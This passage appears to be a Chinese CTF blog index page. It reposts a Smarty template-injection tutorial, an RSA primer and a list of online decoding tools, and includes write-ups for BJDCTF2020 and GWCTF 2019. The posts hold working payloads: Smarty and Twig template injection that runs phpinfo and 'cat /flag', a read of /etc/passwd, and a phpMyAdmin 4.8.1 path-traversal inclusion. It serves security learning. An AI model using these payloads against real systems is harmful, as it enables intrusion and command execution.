<p>因为在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
<p><strong>3. {literal}</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;   </span><br></pre></td></tr></table></figure>

<p>这个地方借助了 {literal} 这个标签，因为 {literal} 可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。但是这种写法只适用于php5环境，这道ctf使用的是php7，所以依然失败</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233719367-1535357026.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233719367-1535357026.png" alt="img"></a></p>
<p><strong>4.</strong> <strong>getstreamvariable</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>Smarty类的getStreamVariable方法的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function getStreamVariable($variable)</span><br><span class="line">&#123;</span><br><span class="line">        $_result = &#x27;&#x27;;</span><br><span class="line">        $fp = fopen($variable, &#x27;r+&#x27;);</span><br><span class="line">        if ($fp) &#123;</span><br><span class="line">            while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) &#123;</span><br><span class="line">                $_result .= $current_line;</span><br><span class="line">            &#125;</span><br><span class="line">            fclose($fp);</span><br><span class="line">            return $_result;</span><br><span class="line">        &#125;</span><br><span class="line">        $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this;</span><br><span class="line">        if ($smarty-&gt;error_unassigned) &#123;</span><br><span class="line">            throw new SmartyException(&#x27;Undefined stream variable &quot;&#x27; . $variable . &#x27;&quot;&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法。然而使用这个payload会触发报错如下：</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234305773-495371489.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234305773-495371489.png" alt="img"></a></p>
<p>可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。 对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
<p><strong>5. {if}{&#x2F;if}</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p>Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{&#x2F;if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||<em>，or，&amp;&amp;，and，is_array()等等，如：{if is_array($array)}{&#x2F;if}</em></p>
<p>既然这样就将XFF头改为 {if phpinfo()}{&#x2F;if} ：</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234610811-341143885.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234610811-341143885.png" alt="img"></a></p>
<p>同样还能用来执行一些系统命令：</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234755671-2008092498.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234755671-2008092498.png" alt="img"></a></p>
<p><strong>CTF漏洞成因</strong></p>
<p>本题中引发SSTI的代码简化后如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    require_once(&#x27;./smarty/libs/&#x27; . &#x27;Smarty.class.php&#x27;);</span><br><span class="line">    $smarty = new Smarty();</span><br><span class="line">    $ip = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">    $smarty-&gt;display(&quot;string:&quot;.$ip);     // display函数把标签替换成对象的php变量；显示模板</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。</p>
<p>为转载，原博客为：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p>
</blockquote>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/13/ssti/ssti/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/13/%E5%AF%86%E7%A0%81/rsa/">
        <h2 class="post-title">rsa</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/13
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>RSA加密算法是一种非对称加密算法。RSA是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。</p>
<p>1973年，在英国政府通讯总部工作的数学家克利福德·柯克斯（Clifford Cocks）在一个内部文件中提出了一个相同的算法，但他的发现被列入机密，一直到1997年才被发表。</p>
<p><strong>对极大整数做因数分解的难度决定了RSA算法的可靠性。</strong> 换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。<strong>假如有人找到一种快速因数分解的算法的话，那么用RSA加密的信息的可靠性就肯定会极度下降。</strong> 但找到这样的算法的可能性是非常小的。今天只有短的RSA钥匙才可能被强力方式解破。到目前为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。</p>
<h2 id="一、举一个通俗易懂的例子"><a href="#一、举一个通俗易懂的例子" class="headerlink" title="一、举一个通俗易懂的例子"></a>一、举一个通俗易懂的例子</h2><p>看一个数学小魔术：</p>
<p><strong>让A写下一个任意3位数，并将这个数和91相乘；然后将积的最后三位数告诉B，这样B就可以计算出A写下的是什么数字了。</strong></p>
<ul>
<li>比如A写下的是123，并且A计算出123 * 91等于11193，并把结果的末三位193告诉B ；</li>
<li>B只需要把193再乘以11，193 * 11 &#x3D; 2123 末三位就是A写下的数字了；</li>
</ul>
<p><strong>道理很简单，91乘以11等于1001，而任何一个三位数乘以1001后，末三位显然都不变（例如123乘以1001就等于123123）。</strong></p>
<p>知道原理后，可以构造一个定义域和值域更大的加密解密系统。<br>例如：</p>
<ul>
<li>任意一个数乘以400000001后，末8位都不变，而400000001 &#x3D; 19801 * 20201。于是A来乘以19801，B来乘以20201，又一个加密解密不对称的系统就构造好了；</li>
<li>甚至可以构造得更大一些 4000000000000000000000000000001 &#x3D; 1199481995446957 * 3334772856269093，这样我们就成功构造了一个30位的加密系统；</li>
</ul>
<p>如果仅仅按照上面的思路，如果对方知道原理，非常容易穷举出400000001这个目标值；<strong>RSA算法使用的是指数和取模运算，本质上就是上面这套思想。</strong></p>
<p>此段落转载自：<br><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/33645891">如何用通俗易懂的话来解释非对称加密?</a></p>
<h2 id="二、一句话："><a href="#二、一句话：" class="headerlink" title="二、一句话："></a>二、一句话：</h2><p>对极大整数做因数分解的难度决定了RSA算法的可靠性。</p>
<h2 id="三、RSA加密算法"><a href="#三、RSA加密算法" class="headerlink" title="三、RSA加密算法"></a>三、RSA加密算法</h2><h3 id="3-1、维基百科——RSA加密算法"><a href="#3-1、维基百科——RSA加密算法" class="headerlink" title="3.1、维基百科——RSA加密算法"></a>3.1、维基百科——RSA加密算法</h3><p>先看一下维基百科的算法描述：</p>
<h4 id="公钥与私钥的产生"><a href="#公钥与私钥的产生" class="headerlink" title="公钥与私钥的产生"></a>公钥与私钥的产生</h4><ul>
<li>1、随意选择两个大的质数 p和 q，p不等于 q，计算 N&#x3D;pq</li>
<li>2、根据欧拉函数，求得 r</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">r</span> = φ(N) = φ(p)φ(q) = (p-<span class="number">1</span>)(q-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>3、选择一个小于r并与r互质的整数e，求得e关于r的模反元素，命名为d （ ed ≡ 1(mod r) 模反元素存在，当且仅当e与r互质 ）；</li>
<li>4、销毁p和q，此时 (N , e)是公钥，(N, d)为私钥；</li>
</ul>
<h4 id="加密消息"><a href="#加密消息" class="headerlink" title="加密消息"></a>加密消息</h4><p>假设Bob想给Alice发送一个消息 <code>n</code>，他知道Alice产生的 <code>N</code>和 <code>e</code> ；用下面这个公式他可以将 <code>n</code>加密为 <code>c</code> ：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">c ≡ n^e (<span class="built_in">mod</span> N)</span><br></pre></td></tr></table></figure>

<p>计算 <code>c</code>并不复杂。Bob算出 <code>c</code>后就可以将它传递给Alice。</p>
<h4 id="解密消息"><a href="#解密消息" class="headerlink" title="解密消息"></a>解密消息</h4><p>Alice得到Bob的消息 <code>c</code>后就可以利用她的密钥<code>d</code>来解码。可以用以下这个公式来将 <code>c</code>转换为 <code>n</code>：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">n ≡ c^d (<span class="built_in">mod</span> N)</span><br></pre></td></tr></table></figure>

<p>此段落转载自：<br><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/RSA%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95">维基百科——RSA加密算法</a></p>
<h3 id="3-2、依照算法公式举个例子"><a href="#3-2、依照算法公式举个例子" class="headerlink" title="3.2、依照算法公式举个例子"></a>3.2、依照算法公式举个例子</h3><p>依照算法公式来举个例子</p>
<h4 id="1、随意选择两个大的质数-p和-q，p不等于-q，计算-N-pq"><a href="#1、随意选择两个大的质数-p和-q，p不等于-q，计算-N-pq" class="headerlink" title="1、随意选择两个大的质数 p和 q，p不等于 q，计算 N&#x3D;pq"></a>1、随意选择两个大的质数 p和 q，p不等于 q，计算 N&#x3D;pq</h4><p><strong>质数</strong> 定义：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">除了1和该数自身外，无法被其他自然数整除的数。</span><br></pre></td></tr></table></figure>

<p>举例：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">p</span> = <span class="number">3</span>；</span><br><span class="line"><span class="attr">q</span> = <span class="number">5</span><span class="comment">;</span></span><br><span class="line"><span class="attr">N</span> = <span class="number">3</span>*<span class="number">5</span> = <span class="number">15</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h4 id="2、根据欧拉函数，求得-r"><a href="#2、根据欧拉函数，求得-r" class="headerlink" title="2、根据欧拉函数，求得 r"></a>2、根据欧拉函数，求得 r</h4><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">r</span> = φ(N) = φ(p)φ(q) = (p-<span class="number">1</span>)(q-<span class="number">1</span>)。</span><br></pre></td></tr></table></figure>

<p><strong>欧拉函数</strong> 定义：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">欧拉函数 φ(n)是小于或等于n的正整数中与n互质的数的数目。</span><br><span class="line"></span><br><span class="line">例如：φ(8) = 4，因为1,3,5,7均和8互质。</span><br></pre></td></tr></table></figure>

<p>举例：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">r</span> = φ(N) = φ(p)φ(q) = (p-<span class="number">1</span>)(q-<span class="number">1</span>) <span class="comment">;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">r</span> = φ(<span class="number">15</span>) = φ(<span class="number">3</span>)φ(<span class="number">5</span>) = (<span class="number">3</span>-<span class="number">1</span>)(<span class="number">5</span>-<span class="number">1</span>) <span class="comment">;</span></span><br><span class="line"><span class="attr">r</span> = <span class="number">8</span></span><br></pre></td></tr></table></figure>

<h4 id="3、选择一个小于r并与r互质的整数e，求得e关于r的模反元素，命名为d-（-ed-≡-1-mod-r-模反元素存在，当且仅当e与r互质-）；"><a href="#3、选择一个小于r并与r互质的整数e，求得e关于r的模反元素，命名为d-（-ed-≡-1-mod-r-模反元素存在，当且仅当e与r互质-）；" class="headerlink" title="3、选择一个小于r并与r互质的整数e，求得e关于r的模反元素，命名为d （ ed ≡ 1(mod r) 模反元素存在，当且仅当e与r互质 ）；"></a>3、选择一个小于r并与r互质的整数e，求得e关于r的模反元素，命名为d （ ed ≡ 1(mod r) 模反元素存在，当且仅当e与r互质 ）；</h4><p><strong>互质</strong> 定义：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果两个或两个以上的整数的最大公约数是 1，则称它们为互质</span><br><span class="line"></span><br><span class="line">例如：1,3,5,7均和8互质</span><br></pre></td></tr></table></figure>

<p><strong>模反元素</strong> 定义：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-<span class="number">1</span> 被n整除，或者说ab被n除的余数是<span class="number">1</span>。</span><br><span class="line"></span><br><span class="line">例如：比如<span class="number">3</span>和<span class="number">5</span>互质，<span class="number">3</span>关于<span class="number">5</span>的模反元素就可能是<span class="number">2</span>，因为 (<span class="number">3</span>*<span class="number">2</span>)%5=<span class="number">1</span> 。</span><br></pre></td></tr></table></figure>

<p>举例：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 选择一个小于r并与r互质的整数e (1,3,5,7均和8互质)：</span></span><br><span class="line">e = <span class="number">7</span>;</span><br><span class="line"><span class="comment">// 求得e关于r的模反元素，命名为d （    ed ≡ 1(mod r)     ) </span></span><br><span class="line"></span><br><span class="line">ed ≡ <span class="number">1</span>(<span class="keyword">mod</span> r) ;</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>*d ≡ <span class="number">1</span>(<span class="keyword">mod</span> <span class="number">8</span>) ;</span><br><span class="line"><span class="number">7</span>*d%<span class="number">8</span> = <span class="number">1</span>; </span><br><span class="line"><span class="comment">// 这里取d = 15</span></span><br><span class="line">d = <span class="number">15</span>；</span><br></pre></td></tr></table></figure>

<h4 id="4、销毁p和q，此时-N-e-是公钥，-N-d-为私钥"><a href="#4、销毁p和q，此时-N-e-是公钥，-N-d-为私钥" class="headerlink" title="4、销毁p和q，此时 (N , e)是公钥，(N, d)为私钥"></a>4、销毁p和q，此时 (N , e)是公钥，(N, d)为私钥</h4><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 公钥  (N , e)</span></span><br><span class="line">( <span class="number">15</span>,<span class="number">7</span> )</span><br><span class="line"><span class="comment">// 私钥 (N, d)</span></span><br><span class="line">( <span class="number">15</span>,<span class="number">15</span> )</span><br></pre></td></tr></table></figure>

<h4 id="5、加密"><a href="#5、加密" class="headerlink" title="5、加密"></a>5、加密</h4><p>假设Bob想给Alice发送一个消息 <code>n</code>，他知道Alice产生的 <code>N</code>和 <code>e</code> ；用下面这个公式他可以将 <code>n</code>加密为 <code>c</code></p>
<p>举例：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">// 假设 </span><br><span class="line">n = <span class="number">2</span>;</span><br><span class="line"><span class="regexp">//</span> 计算c</span><br><span class="line">c ≡ n^e (mod N) ;</span><br><span class="line"></span><br><span class="line">(c^-<span class="number">1</span> * n^e)%N = <span class="number">1</span> ; </span><br><span class="line">(c^-<span class="number">1</span> * <span class="number">2</span>^<span class="number">7</span>)%15 = <span class="number">1</span> ;</span><br><span class="line"><span class="regexp">//</span> </span><br><span class="line">c = <span class="number">8</span>；</span><br></pre></td></tr></table></figure>

<h4 id="6、解密"><a href="#6、解密" class="headerlink" title="6、解密"></a>6、解密</h4><p>Alice得到Bob的消息 <code>c</code>后就可以利用她的密钥<code>d</code>来解码。可以用以下这个公式来将 <code>c</code>转换为 <code>n</code>：</p>
<p>举例：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算n</span></span><br><span class="line">n ≡ c^<span class="title function_ invoke__">d</span> (<span class="keyword">mod</span> N)</span><br><span class="line"></span><br><span class="line">n ≡ <span class="number">8</span>^<span class="number">15</span> (<span class="keyword">mod</span> <span class="number">15</span>) ；</span><br><span class="line">(n^-<span class="number">1</span> * <span class="number">8</span>^<span class="number">15</span>)%<span class="number">15</span> = <span class="number">1</span> ;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">n = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/13/%E5%AF%86%E7%A0%81/rsa/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/13/%E5%AF%86%E7%A0%81/%E5%AF%86%E7%A0%81/">
        <h2 class="post-title">密码</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/13
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>常用的base编码、url编码等以及各种加密都有</p>
<p><a target="_blank" rel="noopener" href="http://www.hiencode.com/">http://www.hiencode.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://tool.lu/">https://tool.lu/</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/tools.html">https://ctf.bugku.com/tools.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ctftools.com/down/">https://www.ctftools.com/down/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.idcd.com/">https://www.idcd.com/</a></p>
<p>bugku的旧在线工具可以用来枚举栅栏密码和凯撒密码</p>
<p>md5解密</p>
<p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://pmd5.com/">https://pmd5.com/</a></p>
<p>维吉尼亚解密</p>
<p>很多时候可以直接跑出明文</p>
<p><a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p>
<p><a target="_blank" rel="noopener" href="https://www.dcode.fr/vigenere-cipher">https://www.dcode.fr/vigenere-cipher</a> (要科学上网)</p>
<p>rot5&#x2F;13&#x2F;18&#x2F;47</p>
<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a></p>
<p>emoji加密</p>
<p>常见的就是base100和emoji-aes</p>
<p><a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a></p>
<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=937">http://www.atoolbox.net/Tool.php?Id=937</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/base100">https://ctf.bugku.com/tool/base100</a></p>
<p>brainfuck&#x2F;Ook！</p>
<p><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>
<p>零宽字符解密</p>
<p><a target="_blank" rel="noopener" href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p><a target="_blank" rel="noopener" href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a></p>
<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=829">http://www.atoolbox.net/Tool.php?Id=829</a></p>
<p>熊曰&#x2F;兽音&#x2F;佛曰</p>
<p><a target="_blank" rel="noopener" href="http://hi.pcmoe.net/index.html">http://hi.pcmoe.net/index.html</a></p>
<p>需要key的佛曰</p>
<p><a target="_blank" rel="noopener" href="https://talk-with-buddha.netlify.app/">https://talk-with-buddha.netlify.app/</a></p>
<p>解音频里的莫斯密码</p>
<p><a target="_blank" rel="noopener" href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">https://morsecode.world/international/decoder/audio-decoder-adaptive.html</a></p>
<p>Quoted-printable</p>
<p><a target="_blank" rel="noopener" href="http://web.chacuo.net/charsetquotedprintable/">http://web.chacuo.net/charsetquotedprintable/</a></p>
<p>Rabbit解码</p>
<p><a target="_blank" rel="noopener" href="https://www.sojson.com/encrypt_rabbit.html">https://www.sojson.com/encrypt_rabbit.html</a></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/13/%E5%AF%86%E7%A0%81/%E5%AF%86%E7%A0%81/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-Cookie-is-so-stable/">
        <h2 class="post-title">[BJDCTF2020]Cookie is so stable</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/13
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>哈哈哈哈</p>
<p>我tm来了！！！！</p>
<p><img src="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-Cookie-is-so-stable/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211118650.png" alt="image-20240513211118650"></p>
<p>输入1</p>
<p><img src="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-Cookie-is-so-stable/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211326516.png" alt="image-20240513211326516"></p>
<p>看了源码，没有js获取元素，猜测是用的cookie</p>
<p>抓包看看</p>
<p>输入1</p>
<p><img src="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-Cookie-is-so-stable/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211709990.png" alt="image-20240513211709990"></p>
<p>输入2</p>
<p><img src="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-Cookie-is-so-stable/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211733766.png" alt="image-20240513211733766"></p>
<p>cookie is stable实不欺我</p>
<p>那是什么在变呢？</p>
<p><img src="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-Cookie-is-so-stable/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211828916.png" alt="image-20240513211828916"></p>
<p>是这个</p>
<p>那我如果直接改会怎么样呢？</p>
<p>发现会变到cookie里去</p>
<p><img src="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-Cookie-is-so-stable/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513212127489.png" alt="image-20240513212127489"></p>
<p>emm</p>
<p>那我怎么拿到东西呢？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Why not take a closer look at cookies? --&gt;</span><br></pre></td></tr></table></figure>

<p>？？？</p>
<p>什么意思</p>
<p><img src="https://img-blog.csdnimg.cn/20201102181051434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>登登</p>
<p>模版注入</p>
<p>主要是我sql和rce试过了</p>
<p>都不行，就拿这个用了</p>
<p>尝试一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>twig模版注入</p>
<p>拿到flag</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-Cookie-is-so-stable/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/">
        <h2 class="post-title">[GWCTF 2019]我有一个数据库</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/13
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p><img src="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514145231899.png" alt="image-20240514145231899"></p>
<p>除此之外啥也没有，猜测是文件泄露</p>
<p>dir扫描发现phpmyadmin可以进入</p>
<p>进入之后</p>
<p><img src="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514145323308.png" alt="image-20240514145323308"></p>
<p><img src="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514145636934.png" alt="image-20240514145636934"></p>
<p>这个时候就需要介绍一下4.8.1的专属漏洞</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0d75017c154f">phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613） - 简书</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog">【首发】phpmyadmin4.8.1后台getshell</a> </p>
<p>两位大神，已经讲得很详细了</p>
<p>emm，简单来说，emm也不简单</p>
<p>就是有一个白名单，只要是白名单就可以进入，但是因为phpmyadmin人太好了，所以让我们传后面的参数，但是要使用？隔开</p>
<p>所以payload：</p>
<p>?target&#x3D;db_sql.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p>
<p>很多题解都要把问号二次url编码</p>
<p>但是我这里不用，嘻嘻</p>
<p>就拿到了flag</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/">
        <h2 class="post-title"></h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/12
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>[BJDCTF2020]Cookie is so stable</p>
<p>哈哈哈哈</p>
<p>我tm来了！！！！</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211118650.png" alt="image-20240513211118650"></p>
<p>输入1</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211326516.png" alt="image-20240513211326516"></p>
<p>看了源码，没有js获取元素，猜测是用的cookie</p>
<p>抓包看看</p>
<p>输入1</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211709990.png" alt="image-20240513211709990"></p>
<p>输入2</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211733766.png" alt="image-20240513211733766"></p>
<p>cookie is stable实不欺我</p>
<p>那是什么在变呢？</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211828916.png" alt="image-20240513211828916"></p>
<p>是这个</p>
<p>那我如果直接改会怎么样呢？</p>
<p>发现会变到cookie里去</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513212127489.png" alt="image-20240513212127489"></p>
<p>emm</p>
<p>那我怎么拿到东西呢？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Why not take a closer look at cookies? --&gt;</span><br></pre></td></tr></table></figure>

